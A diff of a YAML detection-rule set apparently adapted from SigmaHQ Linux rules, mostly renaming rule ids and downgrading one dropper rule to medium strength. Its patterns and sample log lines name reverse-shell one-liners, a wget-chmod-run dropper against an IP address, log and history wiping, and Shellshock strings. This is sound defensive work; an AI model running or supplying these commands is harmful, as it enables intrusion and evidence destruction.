@@ -12,7 +12,7 @@
 # - A rule's keywords are split across several entries when their benign rates differ (strong, medium, weak).
 # - Each line that matches is a mention: it says the text was seen, never that the action ran.
 
-- id: mention.sigma.reverse_shell_cmdline
+- id: mention.sigma_reverse_shell_cmdline
   title: Reverse shell one-liner text (Sigma "Suspicious Reverse Shell Command Line")
   match:
     literal:
@@ -64,7 +64,7 @@
       - 'Nov 20 10:07:00 app02 bash[812]: HISTORY: PID=812 UID=1000 bash -i ./deploy.sh --env staging'
       - 'Nov 20 10:08:00 app02 healthcheck: timeout 2 bash -c "</dev/tcp/127.0.0.1/8080" && echo ok'
 
-- id: mention.sigma.reverse_shell_listener
+- id: mention.sigma_reverse_shell_listener
   title: Verbose netcat listener (Sigma "Suspicious Reverse Shell Command Line", listener keyword)
   match:
     literal: ['nc -lvvp ']
@@ -87,7 +87,7 @@
       - 'Nov 20 11:01:00 jump01 bash[777]: HISTORY: PID=777 UID=0 nc -l 9000 > /tmp/image.tar'
       - 'Nov 20 11:02:00 jump01 bash[777]: HISTORY: PID=777 UID=0 ncat --listen --keep-open 8443 --ssl'
 
-- id: mention.sigma.reverse_shell_xterm_display
+- id: mention.sigma_reverse_shell_xterm_display
   title: xterm sent to a numbered display (Sigma "Suspicious Reverse Shell Command Line", xterm keyword)
   match:
     literal: ['xterm -display 1']
@@ -110,7 +110,7 @@
       - 'Nov 20 11:04:00 lab01 bash[910]: HISTORY: PID=910 UID=1000 xterm -geometry 80x24'
       - 'Nov 20 11:05:00 lab01 Xorg[600]: (II) xterm display :0 started for user alice'
 
-- id: mention.sigma.dev_tcp_shell
+- id: mention.sigma_dev_tcp_shell
   title: Shell wired to /dev/tcp (Sigma "Suspicious Use of /dev/tcp", shell keywords)
   match:
     literal:
@@ -131,7 +131,7 @@
   rationale: >-
     These keywords attach an interactive shell's file descriptors to a bash /dev/tcp or /dev/udp socket, which is the
     reverse-shell idiom; benign health checks open /dev/tcp only to test a port. The rule's 'bash -i >& /dev/tcp/'
-    keyword is carried by mention.sigma.reverse_shell_cmdline, and its fd-open and probe keywords are separate medium
+    keyword is carried by mention.sigma_reverse_shell_cmdline, and its fd-open and probe keywords are separate medium
     and weak entries.
   examples:
     positive:
@@ -141,7 +141,7 @@
       - 'Nov 20 12:02:00 web01 healthcheck: bash -c "echo > /dev/tcp/127.0.0.1/5432" && echo db up'
       - 'Nov 20 12:03:00 web01 bash[5011]: HISTORY: exec 3<>/dev/null; echo done'
 
-- id: mention.sigma.dev_tcp_fd
+- id: mention.sigma_dev_tcp_fd
   title: Socket opened on a bash /dev/tcp file descriptor (Sigma "Suspicious Use of /dev/tcp", fd keywords)
   match:
     literal: ['cat </dev/tcp/', 'exec 3<>/dev/tcp/', 'exec 5<>/dev/tcp/']
@@ -165,7 +165,7 @@
       - 'Nov 20 12:06:00 web01 bash[5014]: HISTORY: exec 3>&1 4>&2'
       - 'Nov 20 12:07:00 web01 bash[5015]: HISTORY: cat /var/log/nginx/access.log | tail -n 20'
 
-- id: mention.sigma.dev_tcp_probe
+- id: mention.sigma_dev_tcp_probe
   title: Port probe through bash /dev/tcp (Sigma "Suspicious Use of /dev/tcp", probe keyword)
   match:
     literal: ['echo >/dev/tcp/']
@@ -188,7 +188,7 @@
       - 'Nov 20 12:09:00 web01 bash[5017]: HISTORY: echo hello > /tmp/test.txt'
       - 'Nov 20 12:10:00 web01 bash[5018]: HISTORY: nc -z 10.0.0.5 22'
 
-- id: mention.sigma.shell_wget_pipe_interpreter
+- id: mention.sigma_shell_wget_pipe_interpreter
   title: wget output piped into a shell or perl (Sigma "Suspicious Activity in Shell Commands")
   match:
     anchored: 'wget [^\n]{0,200} - http[^\n]{0,300} \| (?:perl|sh|bash)'
@@ -212,7 +212,7 @@
       - 'Nov 20 12:12:00 web01 bash[5020]: HISTORY: wget -O /tmp/release.tar.gz https://downloads.example.org/release.tar.gz'
       - 'Nov 20 12:13:00 web01 bash[5021]: HISTORY: wget -q -O - https://repo.example.org/key.gpg | gpg --dearmor -o /usr/share/keyrings/example.gpg'
 
-- id: mention.sigma.shell_python_http_server
+- id: mention.sigma_shell_python_http_server
   title: Python ad-hoc HTTP server (Sigma "Suspicious Activity in Shell Commands")
   match:
     literal: ['python -m SimpleHTTPServer', '-m http.server']
@@ -235,7 +235,7 @@
       - 'Nov 20 12:15:00 web01 bash[5023]: HISTORY: python3 -m pip install --user httpie'
       - 'Nov 20 12:16:00 web01 gunicorn[700]: [INFO] Listening at: http://0.0.0.0:8000 (700)'
 
-- id: mention.sigma.shell_pty_spawn
+- id: mention.sigma_shell_pty_spawn
   title: Python pty.spawn shell upgrade (Sigma "Suspicious Activity in Shell Commands")
   match:
     literal: ['import pty; pty.spawn']
@@ -258,7 +258,7 @@
       - 'Nov 20 12:18:00 web01 bash[5025]: HISTORY: python3 -c "import platform; print(platform.release())"'
       - 'Nov 20 12:19:00 web01 bash[5026]: HISTORY: script -q /tmp/session.log'
 
-- id: mention.sigma.shell_socat_exec
+- id: mention.sigma_shell_socat_exec
   title: socat executing a program or writing to /tmp (Sigma "Suspicious Activity in Shell Commands")
   match:
     literal: ['socat exec:', 'socat -O /tmp/']
@@ -281,7 +281,7 @@
       - 'Nov 20 12:21:00 web01 systemd[1]: Started socat TCP-LISTEN:2375,fork UNIX-CONNECT:/var/run/docker.sock'
       - 'Nov 20 12:22:00 web01 bash[5028]: HISTORY: socat - TCP:db01:5432'
 
-- id: mention.sigma.shell_socat_connect
+- id: mention.sigma_shell_socat_connect
   title: socat outbound TCP connect (Sigma "Suspicious Activity in Shell Commands")
   match:
     literal: ['socat tcp-connect']
@@ -304,12 +304,12 @@
       - 'Nov 20 12:24:00 web01 bash[5030]: HISTORY: socat TCP-LISTEN:8080,fork TCP:10.0.0.8:80'
       - 'Nov 20 12:25:00 web01 bash[5031]: HISTORY: socat -d -d pty,raw,echo=0 pty,raw,echo=0'
 
-- id: mention.sigma.shell_wget_chmod
+- id: mention.sigma_shell_wget_chmod
   title: wget followed by chmod on the same line (Sigma "Suspicious Activity in Shell Commands")
   match:
     anchored: 'wget [^\n]{1,200}; chmod (?:\+x|777 )'
   case_sensitive: false
-  strength: strong
+  strength: medium
   attack: [T1105, T1222.002]
   telemetry: [linux_text]
   source:
@@ -319,8 +319,8 @@
     upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
   rationale: >-
     Translation of '*wget *; chmod +x*' and '*wget *; chmod 777 *'. Download-then-make-executable in one command line
-    is the botnet and cryptominer dropper shape seen in honeypot and exploit logs. Packaged software never needs it;
-    the benign case is an admin hand-installing a single binary.
+    is the botnet and cryptominer dropper shape seen in honeypot and exploit logs, but admins fetch and run vendor
+    bootstrap scripts the same way, so it is medium here (high upstream); the URL host and target path decide.
   examples:
     positive:
       - 'Nov 20 12:26:00 web01 bash[5032]: HISTORY: cd /tmp; wget http://203.0.113.7/bins/x86; chmod 777 x86; ./x86'
@@ -329,7 +329,7 @@
       - 'Nov 20 12:27:00 web01 bash[5033]: HISTORY: wget https://downloads.example.org/tool.tar.gz && tar xzf tool.tar.gz'
       - 'Nov 20 12:28:00 web01 bash[5034]: HISTORY: chmod +x ./deploy.sh; ./deploy.sh'
 
-- id: mention.sigma.shell_exploit_staging
+- id: mention.sigma_shell_exploit_staging
   title: Exploit-kit staging strings (Sigma "Suspicious Activity in Shell Commands")
   match:
     literal:
@@ -364,7 +364,7 @@
       - 'Nov 20 12:31:00 web01 bash[5036]: HISTORY: chmod 755 /usr/local/bin/backup.sh'
       - 'Nov 20 12:32:00 web01 systemd[1]: Stopping iptables.service - IPv4 firewall with iptables...'
 
-- id: mention.sigma.shell_staging_medium
+- id: mention.sigma_shell_staging_medium
   title: Staging fragments with ordinary uses (Sigma "Suspicious Activity in Shell Commands")
   match:
     literal:
@@ -395,7 +395,7 @@
       - 'Nov 20 12:35:00 web01 bash[5039]: HISTORY: cat /etc/rc.local'
       - 'Nov 20 12:36:00 web01 bash[5040]: HISTORY: chmod +x ./bin/run.sh'
 
-- id: mention.sigma.shell_staging_weak
+- id: mention.sigma_shell_staging_weak
   title: Generic staging fragments (Sigma "Suspicious Activity in Shell Commands")
   match:
     literal: [' | base64 -d ', 'cp /bin/ksh ', 'cp /bin/sh ', '/tmp/x ']
@@ -418,7 +418,7 @@
       - 'Nov 20 12:38:00 web01 bash[5042]: HISTORY: cp /bin/ls /tmp/ls.bak'
       - 'Nov 20 12:39:00 web01 bash[5043]: HISTORY: base64 -w0 report.pdf > report.b64'
 
-- id: mention.sigma.shell_b64_in_tmp
+- id: mention.sigma_shell_b64_in_tmp
   title: Base64 file in /tmp named on a command line (Sigma "Suspicious Activity in Shell Commands")
   match:
     anchored: ' /tmp/[^\n]{0,100}\.b64 '
@@ -441,7 +441,7 @@
       - 'Nov 20 12:41:00 web01 bash[5045]: HISTORY: base64 -d /home/alice/cert.b64 > cert.der'
       - 'Nov 20 12:42:00 web01 bash[5046]: HISTORY: ls -l /tmp/'
 
-- id: mention.sigma.buffer_overflow_exploit
+- id: mention.sigma_buffer_overflow_exploit
   title: Exploit attempt messages (Sigma "Buffer Overflow Attempts")
   match:
     literal: ['attempt to execute code on stack by', '0bin0sh1']
@@ -464,7 +464,7 @@
       - 'Nov 20 13:01:00 sol01 genunix: [ID 540533 kern.notice] SunOS Release 5.10 Version Generic'
       - 'Nov 20 13:02:00 web01 kernel: [ 33.1] NX (Execute Disable) protection: active'
 
-- id: mention.sigma.buffer_overflow_weak
+- id: mention.sigma_buffer_overflow_weak
   title: Crash and padding messages (Sigma "Buffer Overflow Attempts", noisy keywords)
   match:
     literal:
@@ -489,7 +489,7 @@
       - 'Nov 20 13:04:00 web01 snmpd[2211]: Received SNMP packet(s) from UDP: [10.0.0.4]:161'
       - 'Nov 20 13:05:00 web01 kernel: [ 44.0] traps: app[900] general protection fault ip:7f00 sp:7ffd error:0'
 
-- id: mention.sigma.equationgroup_strings
+- id: mention.sigma_equationgroup_strings
   title: Equation Group tool command strings (Sigma "Equation Group Indicators")
   match:
     literal:
@@ -536,7 +536,7 @@
       - 'Nov 20 13:08:00 sun02 bash[613]: HISTORY: cp /etc/hosts /tmp/hosts.bak'
       - 'Nov 20 13:09:00 sun02 auditd[455]: Audit daemon rotating log files'
 
-- id: mention.sigma.equationgroup_generic
+- id: mention.sigma_equationgroup_generic
   title: Equation Group fragments with generic wording (Sigma "Equation Group Indicators")
   match:
     literal: ['ewok -t ', 'xspy -display ', ' --wipe > /dev/null', 'chmod 700 crond', 'chmod 700 sendmail', 'chmod 0700 sendmail']
@@ -559,7 +559,7 @@
       - 'Nov 20 13:11:00 sun02 bash[615]: HISTORY: chmod 755 /etc/init.d/crond'
       - 'Nov 20 13:12:00 sun02 bash[616]: HISTORY: shred -u secrets.txt'
 
-- id: mention.sigma.equationgroup_setuid_root
+- id: mention.sigma_equationgroup_setuid_root
   title: chown root then chmod 4777 (Sigma "Equation Group Indicators")
   match:
     anchored: 'chown root[^\n]{0,200}chmod 4777 '
@@ -582,7 +582,7 @@
       - 'Nov 20 13:14:00 sun02 bash[618]: HISTORY: chown root:root /etc/cron.d/backup; chmod 644 /etc/cron.d/backup'
       - 'Nov 20 13:15:00 sun02 bash[619]: HISTORY: chmod 4755 /usr/bin/passwd'
 
-- id: mention.sigma.equationgroup_noclient_arp
+- id: mention.sigma_equationgroup_noclient_arp
   title: noclient ARP sweep fragment (Sigma "Equation Group Indicators")
   match:
     anchored: 'ping -c 2 [^\n]{1,100}; grep [^\n]{1,100} /proc/net/arp >/tmp/gx'
@@ -605,7 +605,7 @@
       - 'Nov 20 13:17:00 sun02 bash[621]: HISTORY: ping -c 2 10.0.0.9; ip neigh show'
       - 'Nov 20 13:18:00 sun02 bash[622]: HISTORY: grep 10.0.0.9 /proc/net/arp'
 
-- id: mention.sigma.equationgroup_rst_drop
+- id: mention.sigma_equationgroup_rst_drop
   title: noclient RST drop rule (Sigma "Equation Group Indicators")
   match:
     anchored: 'iptables [^\n]{1,60} OUTPUT -p tcp -d 127\.0\.0\.1 --tcp-flags RST RST -j DROP;'
@@ -628,7 +628,7 @@
       - 'Nov 20 13:20:00 sun02 bash[624]: HISTORY: iptables -A INPUT -p tcp --dport 22 -j ACCEPT'
       - 'Nov 20 13:21:00 sun02 bash[625]: HISTORY: iptables -L OUTPUT -n'
 
-- id: mention.sigma.equationgroup_dev_tcp_shell
+- id: mention.sigma_equationgroup_dev_tcp_shell
   title: sh redirected to /dev/tcp (Sigma "Equation Group Indicators")
   match:
     anchored: 'sh >/dev/tcp/[^\n]{1,100} <&1 2>&1'
@@ -651,7 +651,7 @@
       - 'Nov 20 13:23:00 sun02 bash[627]: HISTORY: sh ./backup.sh >/var/log/backup.log 2>&1'
       - 'Nov 20 13:24:00 sun02 bash[628]: HISTORY: bash -c "echo > /dev/tcp/10.0.0.2/22"'
 
-- id: mention.sigma.equationgroup_wget_cron
+- id: mention.sigma_equationgroup_wget_cron
   title: echowrecker download to /tmp/a then chmod /tmp/cron (Sigma "Equation Group Indicators")
   match:
     anchored: '/usr/bin/wget -O /tmp/a http[^\n]{0,200} && chmod 755 /tmp/cron'
@@ -674,7 +674,7 @@
       - 'Nov 20 13:26:00 sun02 bash[630]: HISTORY: /usr/bin/wget -O /tmp/a https://mirror.example.org/a.iso'
       - 'Nov 20 13:27:00 sun02 bash[631]: HISTORY: chmod 755 /usr/local/sbin/cron-report'
 
-- id: mention.sigma.equationgroup_wget_sendmail
+- id: mention.sigma_equationgroup_wget_sendmail
   title: Download and chmod of a fake sendmail (Sigma "Equation Group Indicators")
   match:
     anchored: 'wget http[^\n]{0,200}sendmail; ?chmod \+x (?:/tmp/)?sendmail'
@@ -698,7 +698,7 @@
       - 'Nov 20 13:30:00 sun02 bash[634]: HISTORY: dnf install sendmail; systemctl enable sendmail'
       - 'Nov 20 13:31:00 sun02 bash[635]: HISTORY: wget https://mirror.example.org/sendmail.mc.example'
 
-- id: mention.sigma.history_null_redirect
+- id: mention.sigma_history_null_redirect
   title: Shell history overwritten from /dev/null or /dev/zero (Sigma "Linux Command History Tampering")
   match:
     anchored: 'cat /dev/(?:null|zero) >[^\n]{0,100}sh_history'
@@ -721,7 +721,7 @@
       - 'Nov 20 13:33:00 web01 bash[637]: HISTORY: cat /dev/null > /var/log/app/debug.log'
       - 'Nov 20 13:34:00 web01 bash[638]: HISTORY: tail -n 50 ~/.bash_history'
 
-- id: mention.sigma.history_symlink_null
+- id: mention.sigma_history_symlink_null
   title: Shell history symlinked to /dev/null or /dev/zero (Sigma "Linux Command History Tampering")
   match:
     anchored: 'ln -sf /dev/(?:null|zero) [^\n]{0,100}sh_history'
@@ -744,7 +744,7 @@
       - 'Nov 20 13:36:00 web01 bash[640]: HISTORY: ln -sf /opt/app/current /opt/app/live'
       - 'Nov 20 13:37:00 web01 bash[641]: HISTORY: ls -l ~/.zsh_history'
 
-- id: mention.sigma.history_chattr
+- id: mention.sigma_history_chattr
   title: Shell history made immutable (Sigma "Linux Command History Tampering")
   match:
     anchored: 'chattr \+i[^\n]{0,100}sh_history'
@@ -767,7 +767,7 @@
       - 'Nov 20 13:39:00 web01 bash[643]: HISTORY: chattr +i /etc/resolv.conf'
       - 'Nov 20 13:40:00 web01 bash[644]: HISTORY: lsattr /root/.bash_history'
 
-- id: mention.sigma.history_echo_empty
+- id: mention.sigma_history_echo_empty
   title: Shell history truncated with echo (Sigma "Linux Command History Tampering")
   match:
     anchored: 'echo "" >[^\n]{0,100}sh_history'
@@ -790,7 +790,7 @@
       - 'Nov 20 13:42:00 web01 bash[646]: HISTORY: echo "" > /tmp/empty.txt'
       - 'Nov 20 13:43:00 web01 bash[647]: HISTORY: echo "export HISTSIZE=5000" >> ~/.bashrc'
 
-- id: mention.sigma.history_shred
+- id: mention.sigma_history_shred
   title: Shell history shredded (Sigma "Linux Command History Tampering")
   match:
     anchored: 'shred [^\n]{0,100}sh_history'
@@ -813,7 +813,7 @@
       - 'Nov 20 13:45:00 web01 bash[649]: HISTORY: shred -u /tmp/old-key.pem'
       - 'Nov 20 13:46:00 web01 bash[650]: HISTORY: wc -l ~/.bash_history'
 
-- id: mention.sigma.history_truncate
+- id: mention.sigma_history_truncate
   title: Shell history truncated to zero (Sigma "Linux Command History Tampering")
   match:
     anchored: 'truncate -s0 [^\n]{0,100}sh_history'
@@ -835,7 +835,7 @@
       - 'Nov 20 13:48:00 web01 bash[652]: HISTORY: truncate -s0 /var/log/app/huge.log'
       - 'Nov 20 13:49:00 web01 bash[653]: HISTORY: truncate -s 10G /srv/disk.img'
 
-- id: mention.sigma.history_rm_inline
+- id: mention.sigma_history_rm_inline
   title: Shell history deleted, mid-line (Sigma "Linux Command History Tampering")
   match:
     anchored: ' rm [^\n]{0,100}sh_history'
@@ -859,7 +859,7 @@
       - 'Nov 20 13:51:00 web01 bash[655]: HISTORY: rm -f /tmp/build.log'
       - 'Nov 20 13:52:00 web01 bash[656]: HISTORY: cp ~/.bash_history /backup/'
 
-- id: mention.sigma.history_rm_line_start
+- id: mention.sigma_history_rm_line_start
   title: Shell history deleted, line start (Sigma "Linux Command History Tampering")
   match:
     anchored: '^rm [^\n]{0,100}sh_history'
@@ -882,7 +882,7 @@
       - 'rm -rf /tmp/build-cache'
       - 'mv ~/.bash_history ~/.bash_history.old'
 
-- id: mention.sigma.history_disable
+- id: mention.sigma_history_disable
   title: History logging switched off (Sigma "Linux Command History Tampering")
   match:
     literal: ['empty_bash_history', 'export HISTFILESIZE=0', 'shopt -ou history', 'shopt -uo history']
@@ -906,7 +906,7 @@
       - 'Nov 20 13:54:00 web01 bash[658]: HISTORY: export HISTFILESIZE=100000'
       - 'Nov 20 13:55:00 web01 bash[659]: HISTORY: shopt -s histappend'
 
-- id: mention.sigma.history_clear_builtin
+- id: mention.sigma_history_clear_builtin
   title: history builtin clear or write (Sigma "Linux Command History Tampering", noisy keywords)
   match:
     literal: ['history -c', 'history -w']
@@ -929,7 +929,7 @@
       - 'Nov 20 13:57:00 web01 bash[661]: HISTORY: history | grep ssh'
       - 'Nov 20 13:58:00 web01 bash[662]: HISTORY: history 20'
 
-- id: mention.sigma.shellshock
+- id: mention.sigma_shellshock
   title: Shellshock function-definition expression (Sigma "Shellshock Expression")
   match:
     literal: ['(){:;};', '() {:;};', '() { :;};', '() { :; };']
@@ -952,7 +952,7 @@
       - '10.0.3.8 - - [20/Nov/2026:14:01:00 +0000] "GET /app.js?v=() HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - 'Nov 20 14:02:00 web01 bash[663]: HISTORY: f() { echo hi; }; f'
 
-- id: mention.sigma.ld_so_preload
+- id: mention.sigma_ld_so_preload
   title: /etc/ld.so.preload referenced (Sigma "Code Injection by ld.so Preload")
   match:
     literal: ['/etc/ld.so.preload']
@@ -976,7 +976,7 @@
       - 'Nov 20 14:04:00 web01 bash[665]: HISTORY: cat /etc/ld.so.conf.d/libc.conf'
       - 'Nov 20 14:05:00 web01 ldconfig[700]: ldconfig: /etc/ld.so.conf.d/x86_64-linux-gnu.conf: updated cache'
 
-- id: mention.sigma.symlink_etc_passwd
+- id: mention.sigma_symlink_etc_passwd
   title: Symlink to /etc/passwd (Sigma "Symlink Etc Passwd")
   match:
     literal: ['ln -s -f /etc/passwd', 'ln -s /etc/passwd']
@@ -999,7 +999,7 @@
       - 'Nov 20 14:07:00 web01 bash[667]: HISTORY: ln -s /etc/nginx/sites-available/app /etc/nginx/sites-enabled/app'
       - 'Nov 20 14:08:00 web01 bash[668]: HISTORY: grep alice /etc/passwd'
 
-- id: mention.sigma.bpf_probe_write_user
+- id: mention.sigma_bpf_probe_write_user
   title: eBPF program using bpf_probe_write_user (Sigma "Potential Suspicious BPF Activity - Linux")
   match:
     literal: ['bpf_probe_write_user']
@@ -1022,7 +1022,7 @@
       - 'Nov 20 14:10:00 web01 kernel: [ 901.1] BPF: Loaded program bpf_prog_6deef7357e7b4530 (cilium)'
       - 'Nov 20 14:11:00 web01 falco[1200]: Falco initialized with configuration file /etc/falco/falco.yaml'
 
-- id: mention.sigma.guacamole_shared_session
+- id: mention.sigma_guacamole_shared_session
   title: Two users in one Guacamole session (Sigma "Guacamole Two Users Sharing Session Anomaly")
   match:
     literal: ['(2 users now present)']
@@ -1045,7 +1045,7 @@
       - 'Nov 20 14:13:00 gw01 guacd[2101]: User "alice" joined connection "$a1b2c3" (1 users now present)'
       - 'Nov 20 14:14:00 gw01 guacd[2101]: Connection "$a1b2c3" removed.'
 
-- id: mention.sigma.clamav_trojan
+- id: mention.sigma_clamav_trojan
   title: ClamAV Trojan detection (Sigma "Relevant ClamAV Message")
   match:
     anchored: 'Trojan[^\n]{0,200}FOUND'
@@ -1068,7 +1068,7 @@
       - 'Nov 20 14:16:00 web01 clamd[880]: /var/www/uploads/inv.pdf: OK'
       - 'Nov 20 14:17:00 web01 clamd[880]: SelfCheck: Database status OK. no trojan found in quarantine'
 
-- id: mention.sigma.clamav_virtool
+- id: mention.sigma_clamav_virtool
   title: ClamAV VirTool detection (Sigma "Relevant ClamAV Message")
   match:
     anchored: 'VirTool[^\n]{0,200}FOUND'
@@ -1091,7 +1091,7 @@
       - 'Nov 20 14:19:00 web01 clamd[880]: /tmp/.x/m.exe: OK'
       - 'Nov 20 14:20:00 web01 freshclam[881]: daily.cld updated (version: 27100, sigs: 2063000)'
 
-- id: mention.sigma.clamav_webshell
+- id: mention.sigma_clamav_webshell
   title: ClamAV web shell detection (Sigma "Relevant ClamAV Message")
   match:
     anchored: 'Webshell[^\n]{0,200}FOUND'
@@ -1114,7 +1114,7 @@
       - 'Nov 20 14:22:00 web01 clamd[880]: /var/www/html/index.php: OK'
       - 'Nov 20 14:23:00 web01 clamd[880]: Webshell scan of /var/www finished, nothing to report'
 
-- id: mention.sigma.clamav_rootkit
+- id: mention.sigma_clamav_rootkit
   title: ClamAV rootkit detection (Sigma "Relevant ClamAV Message")
   match:
     anchored: 'Rootkit[^\n]{0,200}FOUND'
@@ -1137,7 +1137,7 @@
       - 'Nov 20 14:25:00 web01 rkhunter[900]: Checking for rootkits... done, none found'
       - 'Nov 20 14:26:00 web01 clamd[880]: /lib/modules/x/ext4.ko: OK'
 
-- id: mention.sigma.clamav_htran
+- id: mention.sigma_clamav_htran
   title: ClamAV HTran detection (Sigma "Relevant ClamAV Message")
   match:
     anchored: 'Htran[^\n]{0,200}FOUND'
@@ -1160,7 +1160,7 @@
       - 'Nov 20 14:28:00 web01 clamd[880]: /tmp/h: OK'
       - 'Nov 20 14:29:00 web01 bash[669]: HISTORY: grep -c FOUND /var/log/clamav/clamav.log'
 
-- id: mention.sigma.crontab_replace
+- id: mention.sigma_crontab_replace
   title: crontab replaced (Sigma "Modifying Crontab", narrowed)
   match:
     anchored: '\) REPLACE \('
@@ -1184,7 +1184,7 @@
       - 'Nov 20 14:31:00 db01 mysqld[700]: Query REPLACE INTO sessions VALUES (1, ''x'')'
       - 'Nov 20 14:32:00 web01 crontab[4411]: (root) LIST (root)'
 
-- id: mention.sigma.sshd_crc32_attack
+- id: mention.sigma_sshd_crc32_attack
   title: OpenSSH crc32 compensation attack message (Sigma "Suspicious OpenSSH Daemon Error")
   match:
     literal: ['Local: crc32 compensation attack']
@@ -1207,7 +1207,7 @@
       - 'Nov 20 14:34:00 gw01 sshd[2202]: Connection closed by 10.0.0.4 port 51022 [preauth]'
       - 'Nov 20 14:35:00 gw01 sshd[2203]: error: kex_exchange_identification: Connection closed by remote host'
 
-- id: mention.sigma.sshd_protocol_errors
+- id: mention.sigma_sshd_protocol_errors
   title: OpenSSH protocol and crypto errors (Sigma "Suspicious OpenSSH Daemon Error", noisy keywords)
   match:
     literal:
@@ -1240,7 +1240,7 @@
       - 'Nov 20 14:37:00 gw01 sshd[2205]: Received disconnect from 10.0.0.4 port 51022:11: disconnected by user'
       - 'Nov 20 14:38:00 gw01 sshd[2206]: Accepted publickey for alice from 10.0.0.4 port 51023 ssh2'
 
-- id: mention.sigma.security_tool_stop
+- id: mention.sigma_security_tool_stop
   title: Firewall or EDR service stopping (Sigma "Disabling Security Tools - Builtin")
   match:
     literal: ['stopping iptables', 'stopping ip6tables', 'stopping firewalld', 'stopping cbdaemon', 'stopping falcon-sensor']
@@ -1249,7 +1249,7 @@
   attack: [T1685, T1686]
   telemetry: [linux_text]
   source:
-    name: 'SigmaHQ: Disabling Security Tools - Builtin (Omer Gunal, Alejandro Ortuno, oscd.community)'
+    name: 'SigmaHQ: Disabling Security Tools - Builtin (Ömer Günal, Alejandro Ortuno, oscd.community)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/syslog/lnx_syslog_security_tools_disabling_syslog.yml
     license: DRL-1.1
     upstream_id: 49f5dfc1-f92e-4d34-96fa-feba3f6acf36
@@ -1263,7 +1263,7 @@
       - 'Nov 20 14:40:00 web01 systemd[1]: Started firewalld.service - firewalld - dynamic firewall daemon.'
       - 'Nov 20 14:41:00 web01 falcon-sensor[900]: CrowdStrike(4): sensor heartbeat ok'
 
-- id: mention.sigma.named_suspicious
+- id: mention.sigma_named_suspicious
   title: BIND refused zone transfer or source-port-zero packet (Sigma "Suspicious Named Error")
   match:
     literal: [' dropping source port zero packet from ', ' denied AXFR from ']
@@ -1287,7 +1287,7 @@
       - 'Nov 20 14:43:00 ns01 named[880]: zone corp.example.org/IN: transferred serial 2026112001'
       - 'Nov 20 14:44:00 ns01 named[880]: client @0x7f1 10.0.0.5#53122 (www.example.org): query: www.example.org IN A'
 
-- id: mention.sigma.vsftpd_errors
+- id: mention.sigma_vsftpd_errors
   title: vsftpd abuse and sandbox errors (Sigma "Suspicious VSFTPD Error Messages")
   match:
     literal:
@@ -1327,7 +1327,7 @@
       - 'Nov 20 14:46:00 ftp01 vsftpd[3302]: [alice] OK LOGIN: Client "10.0.0.4"'
       - 'Nov 20 14:47:00 ftp01 vsftpd[3303]: [alice] OK UPLOAD: Client "10.0.0.4", "/in/report.csv", 2048 bytes'
 
-- id: mention.sigma.vsftpd_syscall_bounds
+- id: mention.sigma_vsftpd_syscall_bounds
   title: vsftpd syscall out of bounds (Sigma "Suspicious VSFTPD Error Messages")
   match:
     anchored: 'syscall [^\n]{1,20} out of bounds'
@@ -1350,7 +1350,7 @@
       - 'Nov 20 14:49:00 ftp01 vsftpd[3305]: [bob] FAIL LOGIN: Client "10.0.0.7"'
       - 'Nov 20 14:50:00 ftp01 kernel: [ 1.0] audit: type=1326 audit(1700000000.1:2): auid=0 syscall=59 compat=0'
 
-- id: mention.sigma.suspicious_log_entries
+- id: mention.sigma_suspicious_log_entries
   title: Promiscuous mode, deactivated services and dropped syslog (Sigma "Suspicious Log Entries")
   match:
     literal: ['entered promiscuous mode', 'Deactivating service', 'Oversized packet received from', 'imuxsock begins to drop messages']
@@ -1373,7 +1373,7 @@
       - 'Nov 20 14:52:00 web01 kernel: [ 2001.1] device eth0 left promiscuous mode'
       - 'Nov 20 14:53:00 web01 rsyslogd: imjournal: journal files changed, reloading...'
 
-- id: mention.sigma.syslog_rm
+- id: mention.sigma_syslog_rm
   title: syslog deleted with rm and no options (Sigma "Commands to Clear or Remove the Syslog - Builtin")
   match:
     anchored: 'rm /var/log/syslog(?:[^.]|$)'
@@ -1396,7 +1396,7 @@
       - 'Nov 20 14:55:00 web01 bash[671]: HISTORY: rm /var/log/syslog.4.gz'
       - 'Nov 20 14:56:00 web01 bash[672]: HISTORY: rm /var/log/nginx/old.log'
 
-- id: mention.sigma.syslog_rm_flags
+- id: mention.sigma_syslog_rm_flags
   title: syslog deleted with rm -r/-f/-rf (Sigma "Commands to Clear or Remove the Syslog - Builtin")
   match:
     anchored: 'rm -(?:r|f|rf) /var/log/syslog(?:[^.]|$)'
@@ -1418,7 +1418,7 @@
       - 'Nov 20 14:58:00 web01 bash[674]: HISTORY: rm -f /var/log/syslog.1'
       - 'Nov 20 14:59:00 web01 bash[675]: HISTORY: rm -rf /var/cache/apt/archives/partial'
 
-- id: mention.sigma.syslog_mv
+- id: mention.sigma_syslog_mv
   title: syslog moved away (Sigma "Commands to Clear or Remove the Syslog - Builtin")
   match:
     anchored: 'mv /var/log/syslog(?:[^.]|$)'
@@ -1441,7 +1441,7 @@
       - 'Nov 20 15:01:00 web01 bash[677]: HISTORY: mv /var/log/syslog.2.gz /archive/'
       - 'Nov 20 15:02:00 web01 bash[678]: HISTORY: mv /var/log/app.log /var/log/app.log.old'
 
-- id: mention.sigma.syslog_truncate_nospace
+- id: mention.sigma_syslog_truncate_nospace
   title: syslog truncated by redirection (Sigma "Commands to Clear or Remove the Syslog - Builtin")
   match:
     anchored: ' >/var/log/syslog(?:[^.]|$)'
@@ -1464,7 +1464,7 @@
       - 'Nov 20 15:04:00 web01 bash[680]: HISTORY: tail -f /var/log/syslog'
       - 'Nov 20 15:05:00 web01 bash[681]: HISTORY: logger -t app "restart" >/dev/null'
 
-- id: mention.sigma.syslog_truncate_space
+- id: mention.sigma_syslog_truncate_space
   title: syslog truncated by redirection with a space (Sigma "Commands to Clear or Remove the Syslog - Builtin")
   match:
     anchored: ' > /var/log/syslog(?:[^.]|$)'
@@ -1486,7 +1486,7 @@
       - 'Nov 20 15:07:00 web01 bash[683]: HISTORY: grep sshd /var/log/syslog > /tmp/sshd.txt'
       - 'Nov 20 15:08:00 web01 bash[684]: HISTORY: cat /dev/null > /var/log/syslog.1'
 
-- id: mention.sigma.useradd_uid0
+- id: mention.sigma_useradd_uid0
   title: New user created with UID 0 (Sigma "Privileged User Has Been Created")
   match:
     anchored: 'new user: name=[^,\n]{1,64}, UID=0,'
@@ -1509,7 +1509,7 @@
